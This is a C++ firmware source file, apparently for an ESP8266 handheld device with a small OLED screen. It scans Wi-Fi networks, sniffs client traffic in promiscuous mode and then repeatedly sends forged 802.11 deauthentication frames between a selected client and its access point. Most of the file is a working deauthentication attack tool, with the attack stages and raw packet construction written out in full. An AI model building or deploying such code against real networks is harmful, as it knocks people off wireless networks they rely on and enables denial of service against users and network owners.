#include "deauth.h"

extern Adafruit_SSD1306 display;
extern bool awaitingExit;
DeauthDisplay* DeauthDisplay::instance = nullptr;

String getVendor(const uint8_t* mac) {
    if ((mac[0] & 0x02) != 0) {
        return "LAA";
    }

    // Read from SD through SPI

    return "Unknown";
}

bool isJunkMac(const uint8_t* mac) {
    // Check for all zeros
    bool allZero = true;
    // Check for all FFs (broadcast)
    bool allFF = true;
    for (int i = 0; i < 6; i++) {
        if (mac[i] != 0x00) allZero = false;
        if (mac[i] != 0xFF) allFF = false;
    }
    if (allZero || allFF) return true;

    // Check multicast bit (least significant bit of first byte)
    // 1 means multicast, 0 means unicast
    if (mac[0] & 0x01) return true;

    return false;  
}

ClientInfo* DeauthDisplay::findClientByMac(uint8_t* addr) {
    for (int i = 0; i < clientIndex; i++) {
        if (memcmp(addr, clients[i].mac, 6) == 0) {
            return &clients[i];
        }
    }
    
    if (clientIndex >= MAX_CLIENTS - 1) {
        Serial.println("At max clients!");
        return nullptr;
    }
    ClientInfo* rtnVal = &clients[clientIndex];
    memcpy(rtnVal->mac, addr, 6);
    clientIndex++;
    return rtnVal;
}

void DeauthDisplay::handleProbeReq(uint8_t* clientMac) {
    ClientInfo* client = findClientByMac(clientMac);

    if (client != nullptr) {
        client->packetCount++;
        client->lastSeenMillis = millis();
        client->probeReqCount++;
        client->direction = Direction::TO_AP;
    }
}
void DeauthDisplay::handleData(uint8_t* receiverMac, uint8_t* transmitterMac, uint8_t* APMac, uint8_t toDS, uint8_t fromDS) {
    ClientInfo* receiver = findClientByMac(receiverMac);
    ClientInfo* transmitter = findClientByMac(transmitterMac);

    // Update counts and timestamps first (common to all cases)
    receiver->packetCount++;
    receiver->lastSeenMillis = millis();
    receiver->dataCount++;

    transmitter->packetCount++;
    transmitter->lastSeenMillis = millis();
    transmitter->dataCount++;

    // Handle based on ToDS/FromDS flags
    if (toDS == 1 && fromDS == 0) {
        // Client -> AP
        receiver->direction = Direction::TO_AP;
        transmitter->direction = Direction::FROM_AP;

        if (memcmp(receiverMac, APMac, 6) == 0) {
            receiver->isAP = true;
        }
        if (memcmp(transmitterMac, APMac, 6) == 0) {
            transmitter->isAP = true;
        } else {
            memcpy(transmitter->linkedAP, receiverMac, 6);
            transmitter->isLinked = true;
        }
    } else if (toDS == 0 && fromDS == 1) {
        // AP -> Client
        receiver->direction = Direction::TO_AP;
        transmitter->direction = Direction::FROM_AP;

        if (memcmp(transmitterMac, APMac, 6) == 0) {
            transmitter->isAP = true;
        }
        if (memcmp(receiverMac, APMac, 6) == 0) {
            receiver->isAP = true;
        } else {
            memcpy(receiver->linkedAP, transmitterMac, 6);
            receiver->isLinked = true;
        }
    } else {
        receiver->direction = Direction::UNKNOWN;
        transmitter->direction = Direction::UNKNOWN;
    }
}

void print_mac(const uint8_t *mac) {
  for (int i = 0; i < 6; i++) {
    if (i) Serial.print(":");
    if (mac[i] < 16) Serial.print("0");
    Serial.print(mac[i], HEX);
  }
}

void DeauthDisplay::snifferCallback(uint8_t *buf, uint16_t len) {
    if (len < 24) return; // Too short

    uint8_t* frame = buf + 12;
    uint16_t frameCtrl = *(uint16_t *)frame;
    uint8_t type = (frameCtrl & 0x000C) >> 2;
    uint8_t subtype = (frameCtrl & 0x00F0) >> 4;

    uint8_t* addr1 = frame + 4;
    uint8_t* addr2 = frame + 10;
    uint8_t* addr3 = frame + 16;

    if (type == 0 && subtype == 4 && !isJunkMac(addr2)) { // Probe Req
        instance->handleProbeReq(addr2);
    } else if (type == 2 && !isJunkMac(addr1) && !isJunkMac(addr2) && !isJunkMac(addr3)) { // Data
        uint8_t toDS = (frameCtrl & 0x0100) >> 8;
        uint8_t fromDS = (frameCtrl & 0x0200) >> 9;
        instance->handleData(addr1, addr2, addr3, toDS, fromDS);
    }
}

bool DeauthDisplay::scanInputs() {
    bool buttonPressed = false;

    if (digitalRead(FIRST_BUTTON) == LOW) {
        awaitingExit = true;
        onExit();
        buttonPressed = true;
    }
    if (digitalRead(SECOND_BUTTON) == LOW) {
        if (currStage == AttackStage::NETWORK_SCANNING) {
            if (WiFi.scanComplete() >= 0) {
                // Save the network
                selectedNetworkIndex = index;

                // Change what mode were on
                currStage = AttackStage::CLIENT_SNIFFING;

                // Get channel
                int32_t channel;
                String dummySsid;
                uint8_t dummyEnc;
                int32_t dummyRssi;
                bool dummyHidden;
                uint8_t* dummyBSSID;

                WiFi.getNetworkInfo(index, dummySsid, dummyEnc, dummyRssi, dummyBSSID, channel, dummyHidden);
                
                // Begin sniffing mode on that channel
                // Station mode
                wifi_set_opmode(STATION_MODE);
                
                // Set channel
                wifi_set_channel(channel);

                // Enable promiscuous mode
                wifi_promiscuous_enable(0);
                wifi_set_promiscuous_rx_cb(DeauthDisplay::snifferCallback);
                wifi_promiscuous_enable(1);

                index = 0;
            }
        } else if (currStage == AttackStage::CLIENT_SNIFFING && clients[index].isLinked) {
            memcpy(&targetClientMAC, clients[index].mac, 6);
            memcpy(&targetAPMAC, clients[index].linkedAP, 6);

            // Disable scanning
            wifi_promiscuous_enable(false);
            wifi_set_promiscuous_rx_cb(nullptr);

            // Free mem
            free(clients);
            clients = nullptr;

            currStage = AttackStage::DEAUTHING;

            Serial.println("setting currstage");
        } else {
            // Toggle deauth attack
            Serial.println("toggle attackToggle");
            attackToggle = !attackToggle;
        }
        buttonPressed = true;
    }
    if (digitalRead(THIRD_BUTTON) == LOW) {
        if (currStage == AttackStage::NETWORK_SCANNING) {
            index = (index + 1) % networksFound;
        } else if (currStage == AttackStage::CLIENT_SNIFFING) {
            index = (index + 1) % clientIndex;
        }
        buttonPressed = true;
    }

    return buttonPressed;
}

void DeauthDisplay::displayScreen() {
    display.clearDisplay();

    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0,0);

    if (currStage == AttackStage::NETWORK_SCANNING) {
        networksFound = WiFi.scanComplete();

        if (networksFound >= 0) {
            String ssid;
            uint8_t encryptionType;
            int32_t RSSI;
            uint8_t* BSSID = nullptr;
            int32_t channel;
            bool isHidden;

            WiFi.getNetworkInfo(index, ssid, encryptionType, RSSI, BSSID, channel, isHidden);

            display.println(String(index + 1) + ") " + (isHidden ? "<Hidden>" : ssid));
            display.println("===================");

            
            if (BSSID != nullptr) {
                char macStr1[9];
                char macStr2[9];
                sprintf(macStr1, "%02X:%02X:%02X", BSSID[0], BSSID[1], BSSID[2]);
                sprintf(macStr2, "%02X:%02X:%02X", BSSID[3], BSSID[4], BSSID[5]);
                display.print("BSSID: ");
                display.println(macStr1);
                display.print("       ");
                display.println(macStr2);
            } else {
                display.println("BSSID: N/A");
            }

            String encStr;
            switch (encryptionType) {
                case ENC_TYPE_NONE:   encStr = "Open"; break;
                case ENC_TYPE_WEP:    encStr = "WEP"; break;
                case ENC_TYPE_TKIP:   encStr = "WPA/TKIP"; break;
                case ENC_TYPE_CCMP:   encStr = "WPA2/CCMP"; break;
                case ENC_TYPE_AUTO:   encStr = "Auto"; break;
                default:              encStr = "Unknown"; break;
            }
            display.println("Enc: " + encStr);

            display.println("Ch: " + String(channel) + " (" + String(RSSI) + "dBm" + ")");
        } else {
            display.println("Loading...");
        }
    } else if (currStage == AttackStage::CLIENT_SNIFFING) {
        char macStr[9];
        sprintf(macStr, "%02X:%02X:%02X", clients[index].mac[3], clients[index].mac[4], clients[index].mac[5]);
        display.println(String(index + 1) + "/" + String(clientIndex + 1) + ") :" + macStr + (clients[index].isAP ? "(AP)" : ""));
        display.println("Vendor: " + getVendor(&clients[index].mac[0]));

        display.println("Last seen "  + String((millis() - clients[index].lastSeenMillis) / 1000) + "s ago");
        display.println("Probe Reqs: " + clients[index].probeReqCount);
        display.println("Data: " + clients[index].dataCount);
        
        display.println(clients[index].direction == Direction::UNKNOWN ? "UNKNOWN" : clients[index].direction == Direction::FROM_AP ? "FROM AP" : "TO AP");

        display.println(clients[index].isLinked ? "LINKED & READY" : "NOT LINKED");
    } else {
        char macStr[9];
        sprintf(macStr, "%02X:%02X:%02X", targetClientMAC[3], targetClientMAC[4], targetClientMAC[5]);
        display.println("Target:");
        display.println(macStr);
        sprintf(macStr, "%02X:%02X:%02X", targetAPMAC[3], targetAPMAC[4], targetAPMAC[5]);
        display.println("AP:");
        display.println(macStr);
        display.println("Packets sent: " + String(deauthPacketsSent));
        display.println(attackToggle ? "Attack Active" : "Sleeping");
    }

    renderSidebar(Icon::CROSS, Icon::RIGHT_ARROW, Icon::TARGET, Icon::DOWN_ARROW, networksFound);

    display.display();
}

void DeauthDisplay::attack() {
    if (attackToggle && currStage == AttackStage::DEAUTHING) {
        Serial.println("Attack running!");
        uint8_t packet[26] = {
            0xC0, 0x00, // Type: deauth (0xC0), Flags: 0x00
            0x00, 0x00, // Duration
            targetClientMAC[0], targetClientMAC[1], targetClientMAC[2],
            targetClientMAC[3], targetClientMAC[4], targetClientMAC[5], // Destination (client)
            targetAPMAC[0], targetAPMAC[1], targetAPMAC[2],
            targetAPMAC[3], targetAPMAC[4], targetAPMAC[5], // Source (AP)
            targetAPMAC[0], targetAPMAC[1], targetAPMAC[2],
            targetAPMAC[3], targetAPMAC[4], targetAPMAC[5], // BSSID
            0x00, 0x00, // Fragment + Sequence
            0x07, 0x00 // Reason: Class 3 frame from non-associated station
        };

        wifi_send_pkt_freedom(packet, 26, false);
        deauthPacketsSent++;

        uint8_t reversePacket[26] = {
            0xC0, 0x00, // Type: deauth
            0x00, 0x00, // Duration
            targetAPMAC[0], targetAPMAC[1], targetAPMAC[2],
            targetAPMAC[3], targetAPMAC[4], targetAPMAC[5], // Destination (AP)
            targetClientMAC[0], targetClientMAC[1], targetClientMAC[2],
            targetClientMAC[3], targetClientMAC[4], targetClientMAC[5], // Source (client)
            targetClientMAC[0], targetClientMAC[1], targetClientMAC[2],
            targetClientMAC[3], targetClientMAC[4], targetClientMAC[5], // BSSID
            0x00, 0x00, // Fragment + Sequence
            0x07, 0x00  // Reason code
        };

        wifi_send_pkt_freedom(reversePacket, 26, false);
        deauthPacketsSent++;
    }
}

DeauthDisplay::DeauthDisplay() {
    instance = this;
}

void DeauthDisplay::onEnter() {
    clients = (ClientInfo*) malloc(sizeof(ClientInfo) * MAX_CLIENTS);
    if (clients) {
        memset(clients, 0, sizeof(ClientInfo) * MAX_CLIENTS);
    } else {
        Serial.println("Unable to allocate memory for the clients. Please restart.");
        while (1);
    }
    WiFi.mode(WIFI_STA);
    WiFi.scanNetworks(true, true);
}

void DeauthDisplay::onExit() {
    currStage = AttackStage::NETWORK_SCANNING;
    clientIndex = 0;
    deauthPacketsSent = 0;

    wifi_promiscuous_enable(false);
    wifi_set_promiscuous_rx_cb(nullptr);

    if (WiFi.scanComplete() >= 0) {
        WiFi.scanDelete();
    }

    if (clients) {
        free(clients);
        clients = nullptr;
    }
}

unsigned long lastAttack = 0;
const unsigned long attackDelay = 50;

void DeauthDisplay::tick() {
    if (millis() - lastAttack >= attackDelay) {
        attack();
        lastAttack = millis();
    }
}

bool DeauthDisplay::timeoutEnabled() {
    return false;
}